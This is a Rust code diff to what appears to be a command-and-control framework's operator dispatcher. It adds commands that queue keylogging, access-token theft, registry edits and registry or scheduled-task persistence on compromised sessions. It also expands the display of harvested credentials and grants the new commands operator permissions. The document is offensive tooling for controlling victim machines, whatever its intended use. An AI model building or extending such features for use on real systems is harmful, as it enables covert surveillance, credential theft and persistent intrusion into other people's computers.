@@ -428,6 +428,102 @@ impl Dispatcher {
                     ),
                 }
             }
+            "keylog" => {
+                let Some(sid) = interacted else {
+                    return Outcome::Error("must 'interact' a session first".into());
+                };
+                if self.registry.get(&sid).await.is_none() {
+                    return Outcome::Error(format!("no session {}", sid));
+                }
+                if args.is_empty() {
+                    return Outcome::Error("usage: keylog <start|stop|dump>".into());
+                }
+                match self
+                    .queue
+                    .push(&sid, "nw/keylog".into(), args, 30_000)
+                    .await
+                {
+                    Ok(task_id) => Outcome::TaskQueued {
+                        session: sid,
+                        task_id,
+                        role: self.operator.role,
+                    },
+                    Err(e) => Outcome::Error(e.to_string()),
+                }
+            }
+            "tokens" => {
+                let Some(sid) = interacted else {
+                    return Outcome::Error("must 'interact' a session first".into());
+                };
+                if self.registry.get(&sid).await.is_none() {
+                    return Outcome::Error(format!("no session {}", sid));
+                }
+                if args.len() > 1 {
+                    return Outcome::Error("usage: tokens [self|all|<pid>]".into());
+                }
+                match self
+                    .queue
+                    .push(&sid, "nw/tokens".into(), args, 60_000)
+                    .await
+                {
+                    Ok(task_id) => Outcome::TaskQueued {
+                        session: sid,
+                        task_id,
+                        role: self.operator.role,
+                    },
+                    Err(e) => Outcome::Error(e.to_string()),
+                }
+            }
+            "persist" => {
+                let Some(sid) = interacted else {
+                    return Outcome::Error("must 'interact' a session first".into());
+                };
+                if self.registry.get(&sid).await.is_none() {
+                    return Outcome::Error(format!("no session {}", sid));
+                }
+                if args.is_empty() {
+                    return Outcome::Error(
+                        "usage: persist list | persist registry|schtasks <name> <command...> | persist remove registry|schtasks <name>".into(),
+                    );
+                }
+                match self
+                    .queue
+                    .push(&sid, "nw/persist".into(), args, 60_000)
+                    .await
+                {
+                    Ok(task_id) => Outcome::TaskQueued {
+                        session: sid,
+                        task_id,
+                        role: self.operator.role,
+                    },
+                    Err(e) => Outcome::Error(e.to_string()),
+                }
+            }
+            "registry" => {
+                let Some(sid) = interacted else {
+                    return Outcome::Error("must 'interact' a session first".into());
+                };
+                if self.registry.get(&sid).await.is_none() {
+                    return Outcome::Error(format!("no session {}", sid));
+                }
+                if args.is_empty() {
+                    return Outcome::Error(
+                        "usage: registry query <path> [value] | set <path> <name> <data> | delete <path> [value]".into(),
+                    );
+                }
+                match self
+                    .queue
+                    .push(&sid, "nw/registry".into(), args, 30_000)
+                    .await
+                {
+                    Ok(task_id) => Outcome::TaskQueued {
+                        session: sid,
+                        task_id,
+                        role: self.operator.role,
+                    },
+                    Err(e) => Outcome::Error(e.to_string()),
+                }
+            }
             "creds" => {
                 let Some(sid) = interacted else {
                     return Outcome::Error("must 'interact' a session first".into());
@@ -445,7 +541,7 @@ impl Dispatcher {
                     }
                     let body = list
                         .iter()
-                        .map(|c| format!("{}  {}  {}", c.source, c.cred_type, c.id))
+                        .map(|c| format!("{}  {}  {}", c.source, c.cred_type, c.identifier))
                         .collect::<Vec<_>>()
                         .join("\n");
                     return Outcome::Local { message: body };
@@ -464,7 +560,10 @@ impl Dispatcher {
                         let body = list
                             .iter()
                             .map(|c| {
-                                format!("{}  {}  session={}", c.source, c.cred_type, c.session_id)
+                                format!(
+                                    "{}  {}  {}  session={}",
+                                    c.source, c.cred_type, c.identifier, c.session_id
+                                )
                             })
                             .collect::<Vec<_>>()
                             .join("\n");
@@ -499,7 +598,7 @@ fn required_role(command: &str) -> Option<Role> {
     match command {
         "sessions" | "interact" | "jobs" => Some(Role::Viewer),
         "shell" | "redirect" | "download" | "upload" | "socks" | "hashes" | "creds" | "script"
-        | "killjob" | "kill" => Some(Role::Operator),
+        | "registry" | "persist" | "keylog" | "tokens" | "killjob" | "kill" => Some(Role::Operator),
         "" => None,
         _ => Some(Role::Viewer),
     }
@@ -516,6 +615,10 @@ fn action_name(command: &str) -> &'static str {
         "upload" => "task.upload",
         "socks" => "task.socks",
         "hashes" => "task.hashes",
+        "keylog" => "task.keylog",
+        "tokens" => "task.tokens",
+        "registry" => "task.registry",
+        "persist" => "task.persist",
         "creds" => "cred.harvest",
         "script" => "automation.run",
         "jobs" => "task.list",
